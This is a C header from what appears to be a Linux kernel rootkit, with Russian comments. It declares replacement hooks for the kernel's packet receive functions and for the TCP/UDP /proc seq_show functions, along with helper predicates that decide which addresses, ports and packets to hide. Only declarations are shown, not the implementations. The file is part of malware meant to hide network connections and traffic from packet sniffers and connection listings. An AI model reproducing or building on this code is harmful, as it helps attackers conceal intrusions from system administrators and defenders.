
#ifndef NET_H
#define NET_H

// разобраться с импортами, убрать лишнее
#include <net/inet_sock.h>				// struct inet_sock
#include <linux/inet.h>					// in4_pton()
#include <linux/ipv6.h> 				// inet6_sk()
#include <uapi/linux/uio.h>				// struct iovec
#include <uapi/linux/netlink.h>			// struct nlmsghdr
#include <uapi/linux/inet_diag.h>		// struct inet_diag_msg
#include <uapi/linux/sock_diag.h> 		// SOCK_DIAG_BY_FAMILY
#include <linux/socket.h>				// struct user_msghdr

#include <linux/ip.h>				// ip_hdr()
#include <linux/ipv6.h>				// ipv6_hdr()

extern int debug_lvl;

// ------------------------------- ip packets --------------------------------------
// packet_rcv packet_rcv_spkt tpacket_rcv linux-source-6.11/net/packet/af_packet.c
// struct sk_buff - linux-headers-6.11.2-common/include/linux/skbuff.h
extern int (*real_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
int ex_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);

extern int (*real_packet_rcv_spkt)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
int ex_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);

extern int (*real_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
int ex_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
// --------------------------------------------------------------------------------

// ------------------------------- socket -----------------------------------------
// extern asmlinkage long (*real_sys_recvmsg)(struct pt_regs *regs);
// asmlinkage long ex_sys_recvmsg(struct pt_regs *regs);

extern asmlinkage long (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v);

extern asmlinkage long (*real_tcp6_seq_show)(struct seq_file *seq, void *v);
asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v);

extern asmlinkage long (*real_udp4_seq_show)(struct seq_file *seq, void *v);
asmlinkage long ex_udp4_seq_show(struct seq_file *seq, void *v);

extern asmlinkage long (*real_udp6_seq_show)(struct seq_file *seq, void *v);
asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v);
// --------------------------------------------------------------------------------



enum Protocols {
    tcp,
    udp
};

enum IP_type {
    ipv4,
    ipv6
};

bool is_hide4_addr(__be32 *saddr, __be32 *daddr, enum Protocols protocol);
bool is_hide6_addr(struct in6_addr *saddr, struct in6_addr *daddr, enum Protocols protocol);
bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type);
bool is_hide_net_info(void* saddr, void* daddr, __be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type);
bool is_skip4_seq_show (void *v, enum Protocols protocol);
bool is_skip6_seq_show (void *v, enum Protocols protocol);
bool is_hide_packet(struct sk_buff *skb);

#endif
